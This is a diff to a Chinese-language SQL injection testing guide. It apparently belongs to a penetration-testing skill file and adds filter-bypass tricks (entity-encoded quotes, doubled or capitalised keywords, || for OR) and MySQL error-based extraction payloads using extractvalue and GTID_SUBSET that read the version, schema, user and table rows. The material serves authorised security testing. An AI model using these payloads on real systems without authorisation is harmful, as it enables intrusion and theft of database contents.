@@ -37,6 +37,8 @@
 ## 3. 探测顺序（从最无害 → 最有杀伤力）
 
 1. **确认注入点**：`id=1'` `id=1"` `id=1)` 看是否报错/异常；`id=1 AND 1=1`（正常）vs `id=1 AND 1=2`（异常）确认布尔差异；数字型用 `id=2-1` 应等于 `id=1`。
+   - ⚠️ **字面引号无报错 ≠ 不可注入**：必须**同时测 HTML 实体形式** `&#39;` / `&#x27;`（**命名实体 `&apos;` 实测常不被解码，勿据其失败下结论**）。若应用"先转义、后实体解码"，字面 `'` 会被转义而实体形式生效（2026-10 实战命中，详见 `encoding-charset-boundary.md` §4.4）。
+   - 同理：若应用"剥离 `=`"或"删关键词"，用 `&#61;`、`seleselectct`（双写）、`From`（大写）、`||`（替 `or`）等**等价形式**再测一遍，再下负向结论。
 2. **数据库指纹**：`SELECT @@version` / `version()` / `db_name()`；延时函数 `sleep(5)` / `WAITFOR DELAY` / `pg_sleep(5)`。
 3. **选技术**：有回显 → 联合查询；有报错 → 报错注入；无回显无报错 → 布尔/时间盲注。
 4. **拿最小证据**（3 条样本即止，不 dump 全库）：`version()` + `database()` + 一行 admin 用户名（脱敏）。
@@ -75,6 +77,35 @@ id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
 -- MSSQL CONVERT
 id=1 AND 1=CONVERT(INT,(SELECT @@version))
 ```
+
+**报错通道选型：`extractvalue` / `updatexml` / `GTID_SUBSET`** `[本 skill 自研，2026-10 实战沉淀]`
+
+三者在**同一注入点、同一目标（MySQL 8.0.22）**上的实测结果：
+
+| 函数 | 本次实测 | 说明 |
+|---|---|---|
+| `extractvalue` | ✅ **可用** | 回显 `XPATH syntax error: '~8.0.22-30'`。**常见误解是"8.0 已移除"，实测仍可用** |
+| `updatexml` | ❌ 被**应用层过滤器**打断 | 该目标过滤器把 `xml` 改写成 `xm<x>l` → 变成 `updatexm<x>l` → 报 `Unknown column 'updatexm'`。**是过滤器问题，不是数据库问题** |
+| `GTID_SUBSET` | ✅ 可用 | 回显 `Malformed GTID set specification '...'`。**不依赖 `xml` 关键词**，适合打会拦 `xml` 的过滤器 |
+
+```sql
+-- extractvalue（首选，MySQL 8.0 实测可用）
+x'||extractvalue(1,concat(0x7e,version())))-- -      -- 注：末尾多一个 )，见下「括号配平」
+-- GTID_SUBSET（过滤器拦 xml/extractvalue 时改用）
+x'||GTID_SUBSET(version(),1))-- -
+x'||GTID_SUBSET(schema(),1))-- -
+x'||GTID_SUBSET((select user()),1))-- -
+x'||GTID_SUBSET((select table_name From Mysql.innodb_table_stats limit 0,1),1))-- -
+x'||GTID_SUBSET((select group_concat(id,title) From (select id,title From tbl limit 0,2) t2),1))-- -
+```
+
+**⚠️ 括号配平（实测踩过的坑）**：注入点**可能带一层外层括号**（本次是 `and (t.title like '%<skey>%')`），此时 payload 的 `--` 注释会**把末尾的 `)` 一起注释掉** → 必须**自己多补一个 `)`** 闭合外层。**判据**：报 `You have an error in your SQL syntax ... near ''`（末尾空）而非预期的函数报错，就说明括号没配平。
+- ❌ `...||extractvalue(1,version())-- -` → 外层 `(` 未闭合 → `You have an error in your SQL syntax ... near ''`
+- ✅ `...||extractvalue(1,version()))-- -` → 正常回显
+
+> **要点**：`GTID_SUBSET` 用 **`||` 拼接**替代 `AND`/`OR`、用 **`like`** 替代 `=` —— 这几个词是自研黑名单的高频目标；而子查询仍要用 `select`/`from`，靠 **`From` 首字母大写**绕"删除 from"、**`seleselectct` 双写**绕"删除 select"（过滤器删掉一个 `select` 后剩回 `select`）。
+> 报错长度有限，**大结果集要用 `limit` 逐行取**。
+> **若字面单引号被正确转义、无报错** → 换 HTML 实体形式 `&#39;` 再测（转义/解码顺序颠倒）→ `encoding-charset-boundary.md` §4.4。
 
 ### 4.4 布尔 / 时间盲注 `[PortSwigger]`
 
